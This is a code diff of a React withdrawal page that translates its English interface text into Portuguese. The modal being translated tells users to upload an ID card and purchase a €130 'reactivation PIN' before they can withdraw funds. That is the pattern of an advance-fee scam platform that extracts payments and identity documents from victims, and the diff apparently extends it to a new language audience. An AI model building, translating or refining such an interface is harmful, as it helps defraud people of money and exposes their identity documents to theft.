-                For security, please upload your ID card and enter your reactivation PIN. A reactivation PIN costs{' '}
-                <strong className="text-orange-200">€130.00</strong> and must be purchased before completing this withdrawal.
+                Por segurança, envie seu documento de identidade e insira seu PIN de reativação. Um PIN de reativação custa{' '}
+                <strong className="text-orange-200">€130,00</strong> e deve ser adquirido antes de concluir este saque.
               </p>
             </div>
 
             <div className="mb-4">
-              <label className="block text-slate-300 text-sm font-medium mb-2">Upload ID Card</label>
+              <label className="block text-slate-300 text-sm font-medium mb-2">Enviar Documento de Identidade</label>
               {!idCardFile ? (
                 <label
                   htmlFor="idCardInput"
                   className="flex flex-col items-center justify-center w-full h-24 border-2 border-dashed border-slate-600 rounded-lg cursor-pointer hover:border-blue-500 transition"
                 >
                   <FaUpload className="w-5 h-5 text-slate-500 mb-1" />
-                  <span className="text-xs text-slate-400">Click to upload (JPG, PNG, PDF – max 5MB)</span>
+                  <span className="text-xs text-slate-400">Clique para enviar (JPG, PNG, PDF – máx 5MB)</span>
                   <input
                     id="idCardInput"
                     ref={idInputRef}
@@ -989,14 +989,14 @@ const Withdraw = () => {
             </div>
 
             <div className="mb-4">
-              <label className="block text-slate-300 text-sm font-medium mb-2">Reactivation PIN</label>
+              <label className="block text-slate-300 text-sm font-medium mb-2">PIN de Reativação</label>
               <div className="relative">
                 <FaKey className="absolute left-3 top-1/2 transform -translate-y-1/2 text-slate-500" />
                 <input
                   type="password"
                   value={reactivationPin}
                   onChange={(e) => setReactivationPin(e.target.value)}
-                  placeholder="Enter PIN"
+                  placeholder="Digite o PIN"
                   maxLength="6"
                   className={`w-full bg-slate-900 border ${
                     pinError ? 'border-red-500' : 'border-slate-700'
@@ -1011,7 +1011,7 @@ const Withdraw = () => {
                 onClick={() => setShowReactivationModal(false)}
                 className="flex-1 py-3 rounded-lg border border-slate-700 text-slate-300 font-medium hover:bg-slate-700/50 transition"
               >
-                Cancel
+                Cancelar
               </button>
               <button
                 onClick={handleVerifyPin}
@@ -1021,7 +1021,7 @@ const Withdraw = () => {
                 {isVerifyingPin ? (
                   <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
                 ) : (
-                  'Reactivate'
+                  'Reativar'
                 )}
               </button>
             </div>
